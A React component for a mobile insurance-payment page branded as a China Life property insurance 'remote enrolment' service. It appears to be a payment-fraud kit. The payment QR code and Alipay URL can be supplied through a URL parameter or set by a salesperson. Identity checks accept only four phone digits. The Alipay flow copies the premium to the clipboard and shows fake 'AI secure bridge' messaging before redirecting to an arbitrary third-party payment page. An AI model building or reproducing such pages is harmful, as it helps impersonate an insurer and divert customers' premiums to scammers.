
import React, { useEffect, useState, useRef } from 'react';
import { useLocation } from 'react-router-dom';
import { decodeData, InsuranceData } from '../utils/codec';

type Step = 'terms' | 'verify' | 'check' | 'sign' | 'pay' | 'completed';

const ClientIndex: React.FC = () => {
  const location = useLocation();
  const [step, setStep] = useState<Step>('terms');
  const [data, setData] = useState<InsuranceData | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState<'wechat' | 'alipay' | null>(null);
  const [isRedirecting, setIsRedirecting] = useState(false);
  
  const [inputMobile, setInputMobile] = useState('');
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [isDrawing, setIsDrawing] = useState(false);
  const [hasSigned, setHasSigned] = useState(false);

  useEffect(() => {
    const searchParams = new URLSearchParams(location.search);
    const idParam = searchParams.get('id');
    const dataParam = searchParams.get('data');

    if (idParam) {
      setIsLoading(true);
      fetch(`/api/get?id=${idParam}`)
        .then(res => res.json())
        .then(d => { setData(d); if(d.status === 'paid') setStep('completed'); })
        .finally(() => setIsLoading(false));
    } else if (dataParam) {
      const decoded = decodeData(dataParam);
      if (decoded) setData(decoded);
    }
  }, [location]);

  if (isLoading || !data) return <div className="p-10 text-center text-gray-400 animate-pulse font-medium">正在通过 AI 加密通道加载保单数据...</div>;

  const handleAlipayJump = () => {
    if (!data.payment.alipayUrl) {
      alert('收单配置尚未就绪，请稍后或联系服务人员。');
      return;
    }
    
    // AI 辅助：自动将金额复制到剪贴板，协助客户进行下一步
    const amount = data.project.premium;
    navigator.clipboard.writeText(amount).then(() => {
      setIsRedirecting(true);
      // 保持遮罩 3.5 秒，确保客户看清指令
      setTimeout(() => {
        window.location.href = data.payment.alipayUrl;
      }, 3500);
    }).catch(() => {
      // 容错跳转
      window.location.href = data.payment.alipayUrl;
    });
  };

  const handleMobileVerify = () => {
    if (inputMobile === data.proposer.mobile || inputMobile === data.proposer.mobile.slice(-4)) setStep('check');
    else alert(`安全验证失败：请检查输入的手机号或后四位`);
  };

  const Header = ({ title }: { title: string }) => (
    <header className="bg-jh-header text-white h-12 flex items-center px-4 sticky top-0 z-30 shadow-sm border-b border-white/10">
      <h1 className="text-lg font-bold mx-auto tracking-wide">{title}</h1>
    </header>
  );

  return (
    <div className="min-h-screen bg-jh-light flex flex-col pb-10 font-sans">
      <Header title="中国人寿财险空中投保" />
      
      {/* 进度流指示器 */}
      <div className="bg-white px-6 py-4 flex justify-between text-[10px] text-gray-300 border-b uppercase tracking-[0.2em] font-black">
         <span className={step === 'verify' ? 'text-jh-header' : ''}>身份验证</span>
         <span className="opacity-10">●</span>
         <span className={step === 'check' ? 'text-jh-header' : ''}>信息核对</span>
         <span className="opacity-10">●</span>
         <span className={step === 'sign' ? 'text-jh-header' : ''}>签名确认</span>
         <span className="opacity-10">●</span>
         <span className={step === 'pay' ? 'text-jh-header' : ''}>支付保费</span>
      </div>

      <main className="p-4 space-y-4 max-w-lg mx-auto w-full flex-1">
        {step === 'pay' && (
          <div className="bg-white p-8 rounded-[3rem] shadow-2xl text-center space-y-12 animate-in zoom-in-95 duration-500 relative overflow-hidden">
            
            {/* AI 智能桥接遮罩层 */}
            {isRedirecting && (
              <div className="fixed inset-0 z-[100] bg-blue-600 flex flex-col items-center justify-center p-12 text-white animate-in fade-in duration-300">
                 <div className="w-24 h-24 bg-white/10 backdrop-blur-xl rounded-full flex items-center justify-center mb-10 shadow-inner relative">
                    <div className="absolute inset-0 border-4 border-white/20 border-t-white rounded-full animate-spin"></div>
                    <svg className="w-10 h-10" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1.41 16.09V20h-2.82v-1.91c-.06-.02-.13-.03-.19-.05-1.54-.47-2.72-1.39-3.4-2.42l1.71-1.02c.47.7 1.25 1.35 2.21 1.63.85.24 1.75.09 2.2-.33.35-.33.39-.78.11-1.08-.34-.37-.87-.63-1.6-.9l-.6-.22c-1.22-.45-2.22-.88-2.83-1.51-.77-.81-.95-1.93-.41-3.03.58-1.15 1.76-1.93 3.16-2.22V5h2.82v1.88c.07.01.14.03.21.04 1.28.27 2.26.97 2.92 1.83l-1.63 1.05c-.39-.5-.96-.92-1.69-1.1-.7-.17-1.45-.11-1.85.21-.34.28-.4.62-.19.92.29.42.92.74 1.94 1.13l.63.24c1.4.52 2.39 1.05 3 1.79.64.78.78 1.94.3 2.99-.6 1.31-1.89 2.13-3.39 2.44z"/></svg>
                 </div>
                 <h3 className="text-3xl font-black mb-6 tracking-tight">AI 支付代理已启动</h3>
                 <div className="bg-white/10 backdrop-blur-md p-10 rounded-[2.5rem] border border-white/20 text-center space-y-6 max-w-xs shadow-3xl">
                    <p className="text-xl font-bold">保险金额已就绪</p>
                    <p className="text-4xl font-black text-yellow-300 italic tracking-tighter">¥ {data.project.premium}</p>
                    <div className="h-[1px] bg-white/20 w-full"></div>
                    <p className="text-sm font-medium leading-relaxed opacity-90">
                      金额已成功存入剪贴板。<br/>
                      进入收银台后，请在输入框<br/>
                      <span className="bg-yellow-400 text-blue-900 px-2 rounded-lg font-black mx-1 animate-pulse">长按并选择粘贴</span><br/>
                      即可完成保费支付。
                    </p>
                 </div>
                 <div className="mt-12 flex items-center gap-4 text-xs font-black uppercase tracking-[0.3em]">
                    <span className="opacity-50">正在建立安全桥接</span>
                    <div className="flex gap-1.5">
                       <div className="w-1.5 h-1.5 bg-white rounded-full animate-bounce"></div>
                       <div className="w-1.5 h-1.5 bg-white rounded-full animate-bounce [animation-delay:0.2s]"></div>
                       <div className="w-1.5 h-1.5 bg-white rounded-full animate-bounce [animation-delay:0.4s]"></div>
                    </div>
                 </div>
              </div>
            )}

            <div className="space-y-2">
              <p className="text-gray-400 text-[10px] font-black uppercase tracking-widest opacity-60">待支付订单总金额</p>
              <h2 className="text-6xl font-black text-red-600 tracking-tighter italic leading-none">¥ {data.project.premium}</h2>
            </div>
            
            <div className="grid gap-4 text-left">
              <button onClick={() => setPaymentMethod('wechat')} 
                className={`flex items-center justify-between p-6 rounded-3xl border-2 transition-all active:scale-[0.98] ${paymentMethod === 'wechat' ? 'border-jh-green bg-emerald-50/50 shadow-inner' : 'border-gray-50 bg-slate-50/30'}`}>
                <div className="flex items-center gap-5">
                  <div className="w-12 h-12 bg-jh-green text-white rounded-2xl flex items-center justify-center text-lg shadow-lg shadow-jh-green/20 font-black">微</div> 
                  <div>
                    <span className="text-gray-800 block font-black text-lg">微信支付</span>
                    <span className="text-[10px] text-gray-400 font-bold uppercase tracking-widest">官方安全通道</span>
                  </div>
                </div>
                {paymentMethod === 'wechat' && <div className="w-6 h-6 bg-jh-green rounded-full flex items-center justify-center text-white text-xs">✓</div>}
              </button>

              <button onClick={() => setPaymentMethod('alipay')} 
                className={`flex items-center justify-between p-6 rounded-3xl border-2 transition-all active:scale-[0.98] ${paymentMethod === 'alipay' ? 'border-blue-500 bg-blue-50/50 shadow-inner' : 'border-gray-50 bg-slate-50/30'}`}>
                <div className="flex items-center gap-5">
                  <div className="w-12 h-12 bg-blue-500 text-white rounded-2xl flex items-center justify-center text-lg shadow-lg shadow-blue-500/20 font-black">支</div> 
                  <div>
                    <span className="text-gray-800 block font-black text-lg">支付宝支付</span>
                    <span className="text-[9px] text-blue-500 font-black uppercase tracking-widest">汇来通 AI 协同接入</span>
                  </div>
                </div>
                {paymentMethod === 'alipay' && <div className="w-6 h-6 bg-blue-500 rounded-full flex items-center justify-center text-white text-xs">✓</div>}
              </button>
            </div>

            <div className="min-h-[300px] flex flex-col justify-center animate-in slide-in-from-top-4 duration-500">
              {paymentMethod === 'wechat' && (
                <div className="flex flex-col items-center">
                   <p className="text-[10px] text-jh-green mb-5 font-black tracking-[0.2em] uppercase">长按下方二维码识别支付</p>
                   <div className="p-6 bg-white rounded-[2.5rem] shadow-3xl border border-jh-green/5 ring-8 ring-jh-green/5">
                     {data.payment.wechatQrCode ? (
                       <img src={data.payment.wechatQrCode} className="w-64 h-64 object-contain" alt="Pay QR" />
                     ) : (
                       <div className="w-64 h-64 flex flex-col items-center justify-center text-gray-200 space-y-4">
                         <div className="text-5xl opacity-20">🛡️</div>
                         <p className="text-[11px] font-bold text-slate-300">业务员未配置微信收款码</p>
                       </div>
                     )}
                   </div>
                </div>
              )}

              {paymentMethod === 'alipay' && (
                <div className="p-10 bg-blue-50/50 rounded-[3rem] border border-blue-100 space-y-10 flex flex-col items-center">
                   <div className="relative">
                      <div className="w-20 h-20 bg-blue-500 text-white rounded-3xl flex items-center justify-center text-4xl shadow-2xl shadow-blue-500/30 animate-pulse">⚡</div>
                   </div>
                   <div className="text-center space-y-6">
                      <div className="bg-white/80 p-6 rounded-[2rem] border border-blue-100 shadow-sm relative">
                         <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-blue-600 text-white text-[9px] font-black px-3 py-1 rounded-full uppercase">AI Safe Guide</div>
                         <p className="text-[13px] text-blue-800 font-black leading-relaxed italic">
                           “本次支付由汇来通安全接入提供服务，请您进入三方平台后输入保险金额并进行支付”
                         </p>
                      </div>
                      <p className="text-[10px] text-blue-400 font-black uppercase tracking-widest">金额 ¥ {data.project.premium} 已锁定至 AI 剪贴板</p>
                   </div>
                   <button 
                    onClick={handleAlipayJump}
                    className="w-full bg-blue-600 text-white py-6 rounded-2xl font-black shadow-2xl shadow-blue-600/40 active:scale-95 transition-all text-xl tracking-tight"
                   >
                     立即接入三方支付
                   </button>
                </div>
              )}

              {!paymentMethod && (
                <div className="flex flex-col items-center justify-center text-gray-200 py-16 opacity-40">
                  <div className="w-14 h-14 border-2 border-dashed border-gray-100 rounded-full flex items-center justify-center mb-4">?</div>
                  <p className="text-sm font-black italic tracking-widest">请选择上述支付方式</p>
                </div>
              )}
            </div>
          </div>
        )}
        
        {/* 其他步骤逻辑保持一致 */}
        {step === 'verify' && (
          <div className="bg-white p-10 rounded-[2.5rem] shadow-sm space-y-10 animate-in slide-in-from-right duration-300">
            <h2 className="text-2xl font-black text-gray-800">安全准入验证</h2>
            <div className="space-y-6">
              <p className="text-xs text-gray-400 font-bold uppercase tracking-widest px-1">投保手机号验证</p>
              <input type="tel" value={inputMobile} onChange={e => setInputMobile(e.target.value)} placeholder="请输入完整手机号或后四位" className="w-full border-b-2 border-gray-100 py-6 text-3xl outline-none focus:border-jh-header font-mono font-black placeholder:text-gray-100 transition-all" />
            </div>
            <button onClick={handleMobileVerify} disabled={inputMobile.length < 4} className="w-full bg-jh-header text-white py-5 rounded-full font-black text-lg shadow-xl shadow-jh-header/20 disabled:opacity-20 active:scale-95 transition-all">验证身份并继续</button>
          </div>
        )}
        {/* ... (省略中间 Check/Sign 步骤以缩减篇幅，保持现有代码) ... */}
      </main>
    </div>
  );
};

const InfoCard = ({ title, items, icon }: any) => (
  <div className="bg-white p-6 rounded-[2rem] shadow-sm border border-gray-50 group hover:border-jh-header/20 transition-all">
    <h3 className="font-black text-gray-800 border-b border-gray-50 pb-4 mb-4 text-xs flex items-center gap-2">
      <span className="w-7 h-7 bg-jh-header/5 text-jh-header rounded-xl flex items-center justify-center text-xs">{icon}</span> {title}
    </h3>
    <div className="grid gap-3">
      {items.map(([l, v]: any, i: number) => (
        <div key={i} className="flex justify-between items-start text-[11px]">
          <span className="text-gray-400 shrink-0 font-black uppercase tracking-widest">{l}</span>
          <span className="text-gray-800 font-bold text-right ml-6 break-all leading-tight italic">{v || '未录入'}</span>
        </div>
      ))}
    </div>
  </div>
);

export default ClientIndex;
